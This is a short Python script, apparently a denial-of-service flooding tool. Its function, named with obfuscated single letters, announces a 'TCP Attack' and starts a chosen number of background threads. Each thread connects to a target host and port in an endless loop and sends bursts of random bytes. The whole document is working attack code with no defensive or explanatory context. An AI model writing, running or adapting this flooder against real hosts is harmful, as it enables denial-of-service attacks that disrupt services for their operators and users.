import socket as s, threading as t, random as r, time as ti, os

def x(a, b, c):
    print(f"\n[+] TCP Attack started on {a}:{b} with {c} threads\n")
    d = r._urandom(1024)

    def y():
        while True:
            try:
                z = s.socket(s.AF_INET, s.SOCK_STREAM)
                z.settimeout(3)
                z.connect((a, b))
                for _ in range(100): z.send(d)
                z.close()
                print(f"[+] Packet sent to {a}:{b}")
            except s.timeout:
                print(f"[!] Timeout {a}:{b}")
            except Exception as e:
                print(f"[!] Error: {str(e)}")

    for _ in range(c):
        t.Thread(target=y, daemon=True).start()
